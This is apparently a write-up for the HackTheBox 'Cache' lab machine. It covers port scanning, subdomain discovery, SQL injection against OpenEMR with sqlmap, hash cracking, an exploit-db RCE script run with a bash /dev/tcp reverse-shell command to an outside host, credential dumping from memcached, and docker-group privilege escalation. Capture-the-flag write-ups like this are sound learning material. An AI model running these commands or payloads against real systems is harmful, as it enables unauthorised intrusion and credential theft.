<h1>Summary</h1>
 Hey ,<br>cashe machine was released today  <br> it's my favorite machine created by ASHacker I am going to share a writeup for it ,the machine available at HackTheBox for penetration testing<br>
in user part we do some basic enumeration gives us a credential and also we got domain which vulnerable with sqlinjection and rce we dump credential with sqlmap and than use it for rce to get shell as www and then we find creds in memcached to got user,for privilege escalation we descoverd that the user is in the group docker we got root very easily
 
  <br> 

<h2>Walkthrough</h2>
<h4>Reconnaissance</h4>
---
We start with scan ports:

```
$ nmap -A 10.10.10.188
Starting Nmap 7.60 ( https://nmap.org ) at 2020-08-21 09:17 CET
Nmap scan report for cache.htb (10.10.10.188)
Host is up (0.33s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

|_http-title: Cache                                                                                                                                      
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.04 seconds
```                                                                                                                                                      
From the result above we found two working ports , port 80 and port 22                                                                                   
lets start with port 80                                                                                                                                  
![Desktop View](/img/00.png)

we find login page i've tried sql injection in login form but it's failed because the website isn't affected
![Desktop View](/img/0.png)


<h4>Enumeration</h4>


so i run dirb

![Desktop View](/img/1.png)
i found two directory
javascript 
and 
jquery
when i opened jquery i found one file there functionality.js i got inside the file 
<br>password : H@v3_fun
<br>username : ash
we keep it in text and keep continue

![Desktop View](/img/2.png)


<h5>Subdomain Enumeration FUFF</h5>
looking for domain with ffuf

![Desktop View](/img/3.png)
We found domain named hms like you see in the screen
add the domain in /etc/hosts
```
10.10.10.188    hms.htb
```
we open the domain in the browser 
![Desktop View](/img/4.png)
then i discovered that the application running in this domain is vulnerable with sql injection
<br>
by some googling i found youtube video explaining the vulnerability 


<br>
```https://www.youtube.com/watch?v=DJSQ8Pk_7hc ```
<br>

We intercept with burp

![Desktop View](/img/5.png)

We save the request in file
![Desktop View](/img/6.png)

then we inject with sqlmap :
```sqlmap -r om.req  --dbs```
<br>om.req ---> the request we saved
<br>
\--dbs  ---> Enumerate databases

![Desktop View](/img/7.png)
<br>we found the name of database 
![Desktop View](/img/8.png)
<br>we need to enmerate the tables
``` sqlmap -r login.req -D openemr --table ```
<br>-D      ---> name of database we want to enumrate 
<br>--table ---> Enumerate  tables
<br>we got all tables in openemr now we need to dump user and password from  users_secure<br>
``` sqlmap -r login.req -D openemr -T users_secure --dump ```

![Desktop View](/img/10.png)

![Desktop View](/img/11.png)
like you see we found a hashed password <br>
we need to crack the hash with john <br>
```
$ john /tmp/hash -wordlist=rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 32 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xxxxxx           (?)
1g 0:00:00:00 DONE (2020-08-21 16:12) 3.333g/s 2880p/s 2880c/s 2880C/s caitlin..felipe
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
<br>
and we got  the password xxxxxx Now we can login into openemr 
<br>and by some googling we find openemr it's also affected by rce (allow us to upload shell) 
<br>we download the script from exploit-db and run it
</br>https://www.exploit-db.com/exploits/45161

![Desktop View](/img/13.png)
<br>
```python 45161.py http://hms.htb/ -u openemr_admin -p xxxxxx -c 'bash -i >& /dev/tcp/10.10.14.212/1338 0>&1'```

<br> we get our reverse shell
<h4>Privilege Escalation</h4>
i run netstat command <br> ```netstat -plant```
<br>


![Desktop View](/img/14.png)


<br>and i notice the port 11211 is open in local this port of memcached service

<br>lets dump data from it 
<br>connect with telnet
```telnet localhost 11211```
<br>lets start first with STAT command to print all the general statistics of the server
```STAT items:1:number 5
STAT items:1:number_hot 0
STAT items:1:number_warm 0
STAT items:1:number_cold 5
STAT items:1:age_hot 0
STAT items:1:age_warm 0
STAT items:1:age 30
STAT items:1:evicted 0
STAT items:1:evicted_nonzero 0
STAT items:1:evicted_time 0
STAT items:1:outofmemory 0
STAT items:1:tailrepairs 0
STAT items:1:reclaimed 0
STAT items:1:expired_unfetched 0
STAT items:1:evicted_unfetched 0
STAT items:1:evicted_active 0
STAT items:1:crawler_reclaimed 0
STAT items:1:crawler_items_checked 140
STAT items:1:lrutail_reflocked 0
STAT items:1:moves_to_cold 3205
STAT items:1:moves_to_warm 0
STAT items:1:moves_within_lru 0
STAT items:1:direct_reclaims 0
STAT items:1:hits_to_hot 0
STAT items:1:hits_to_warm 0
STAT items:1:hits_to_cold 0
STAT items:1:hits_to_temp 0
END
```
then 
stats cachedump 1 0

```
stats cachedump 1 0

ITEM link [21 b; 0 s]
ITEM user [5 b; 0 s]
ITEM passwd [9 b; 0 s]
ITEM file [7 b; 0 s]
ITEM account [9 b; 0 s]                                                                                                                                  
END   
```
get user
```
get user                                                                                                                                       
VALUE user 0 5
luffy
END
```
get passwd
```
get passwd
VALUE passwd 0 9
0n3_p1ec3
END
```
<br>![Desktop View](/img/15.png)

<br>we got user and password we connect with ssh
and we we figured out the user luffy is in doker group



we go to gtfobins 

```https://gtfobins.github.io/gtfobins/docker/```


<br>![Desktop View](/img/16.png)
```
luffy@cache:~$ docker images
 REPOSITORY TAG IMAGE ID CREATED SIZE
 ubuntu latest 2ca708c1c9cc 7 months ago 64.2MB
 ```
 
<br>![Desktop View](/img/17.png)
and we got root
